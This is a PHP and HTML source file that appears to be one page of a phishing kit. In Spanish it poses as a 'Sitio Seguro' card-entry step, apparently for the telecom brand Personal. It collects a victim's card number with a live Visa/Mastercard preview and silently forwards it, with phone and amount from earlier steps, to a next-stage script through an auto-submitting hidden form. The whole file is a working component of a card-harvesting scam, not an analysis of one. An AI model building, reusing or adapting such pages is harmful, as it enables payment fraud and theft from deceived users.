<?php
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
if(isset($_POST['card'])) { ?>
    <form id="autoForm" method="POST" action="step4.php">
        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
        <input type="hidden" name="card" value="<?php echo htmlspecialchars($_POST['card']); ?>">
    </form>
    <script>document.getElementById('autoForm').submit();</script>
<?php exit; } ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Datos de la tarjeta | Personal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #2a2a2a; color: #fff; min-height: 100vh; }
        .header { background: #2a2a2a; border-bottom: 1px solid #3a3a3a; color: #fff; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
        .logo { font-size: 18px; font-weight: 600; }
        .sitio-seguro { font-size: 12px; }
        .container { max-width: 500px; margin: 60px auto; padding: 0 20px; }
        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 50px; }
        
        /* TARJETA FRENTE */
        .tarjeta { width: 100%; max-width: 400px; height: 240px; margin: 0 auto 50px; border-radius: 12px; padding: 25px 30px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: background 0.3s ease; }
        .tarjeta.visa { background: linear-gradient(135deg, #1e3a8a 0%, #2563eb 100%); }
        .tarjeta.mastercard { background: linear-gradient(135deg, #dc2626 0%, #ea580c 100%); }
        
        .tarjeta-logo { position: absolute; top: 20px; right: 25px; font-size: 20px; font-weight: 700; color: #fff; text-transform: uppercase; }
        .mastercard-circles { position: absolute; top: 20px; left: 25px; display: flex; gap: -10px; }
        .circle { width: 35px; height: 35px; border-radius: 50%; }
        .circle-red { background: #eb001b; }
        .circle-orange { background: #f79e1b; margin-left: -12px; }
        
        .tarjeta-chip { width: 50px; height: 40px; background: linear-gradient(135deg, #ffd700 0%, #daa520 100%); border-radius: 8px; margin-bottom: 40px; position: relative; }
        .tarjeta-chip::before { content: ''; position: absolute; top: 8px; left: 8px; width: 34px; height: 24px; border: 1px solid rgba(0,0,0,0.2); border-radius: 3px; }
        
        .tarjeta-numero { font-size: 26px; letter-spacing: 4px; font-family: 'Courier New', monospace; margin-bottom: 30px; font-weight: 400; color: #fff; }
        .tarjeta-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
        .tarjeta-venc-label { font-size: 10px; opacity: 0.7; margin-bottom: 3px; }
        .tarjeta-venc { font-size: 14px; font-family: 'Courier New', monospace; }
        
        label { display: block; margin-bottom: 8px; font-size: 14px; color: #fff; }
        input { width: 100%; padding: 14px 16px; background: #1a1a1a; border: 1px solid #444; border-radius: 6px; color: #fff; font-size: 16px; }
        input:focus { outline: none; border-color: #5d8bf4; }
        .help-text { font-size: 13px; color: #999; margin-top: 6px; }
        
        .botones { display: flex; gap: 12px; margin-top: 40px; }
        button { flex: 1; padding: 14px; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
        .btn-volver { background: transparent; border: 1px solid #5d8bf4; color: #5d8bf4; }
        .btn-siguiente { background: #5d8bf4; color: #fff; }
        .btn-siguiente:disabled { background: #444; cursor: not-allowed; opacity: 0.5; }
    </style>
</head>
<body>
    <div class="header"><div class="logo">personal flow</div><div class="sitio-seguro">🔒 Sitio Seguro</div></div>
    <div class="container">
        <h1>Datos de la tarjeta</h1>
        <div class="tarjeta visa" id="tarjeta">
            <div class="tarjeta-logo" id="logoTarjeta">VISA</div>
            <div class="mastercard-circles" id="mcCircles" style="display:none;">
                <div class="circle circle-red"></div>
                <div class="circle circle-orange"></div>
            </div>
            <div class="tarjeta-chip"></div>
            <div class="tarjeta-numero" id="displayNumero">4444 4444 4444 4444</div>
            <div class="tarjeta-bottom">
                <div><div class="tarjeta-venc-label">MM/AA</div><div class="tarjeta-venc" id="displayVenc">02/26</div></div>
            </div>
        </div>
        <form method="POST" action="step3.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <label>Número de la Tarjeta</label>
            <input type="text" name="card" id="numTarjeta" placeholder="4444 4444 4444 4444" maxlength="19" required autocomplete="off">
            <div class="help-text">Ingresá los 16 dígitos del frente de la tarjeta</div>
            <div class="botones">
                <button type="button" class="btn-volver" onclick="window.history.back()">Anterior</button>
                <button type="submit" class="btn-siguiente" id="btnContinuar" disabled>Siguiente</button>
            </div>
        </form>
    </div>
    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        $(document).ready(function(){
            if (typeof $.fn.mask !== 'undefined') { $('#numTarjeta').mask('0000 0000 0000 0000'); }
            $('#numTarjeta').on('input', function(){
                var valor = $(this).val(); var numero = valor.replace(/ /g, '');
                $('#displayNumero').text(valor || '4444 4444 4444 4444');
                var $tarjeta = $('#tarjeta'); var $logo = $('#logoTarjeta'); var $circles = $('#mcCircles');
                if (numero.match(/^4/)) {
                    $tarjeta.removeClass('mastercard').addClass('visa');
                    $logo.text('VISA').show();
                    $circles.hide();
                } else if (numero.match(/^5[1-5]/) || numero.match(/^2[2-7]/)) {
                    $tarjeta.removeClass('visa').addClass('mastercard');
                    $logo.hide();
                    $circles.show();
                } else {
                    $tarjeta.removeClass('mastercard').addClass('visa');
                    $logo.text('VISA').show();
                    $circles.hide();
                }
                if (numero.length >= 15) { $('#btnContinuar').prop('disabled', false); } else { $('#btnContinuar').prop('disabled', true); }
            });
        });
    </script>
</body>
</html>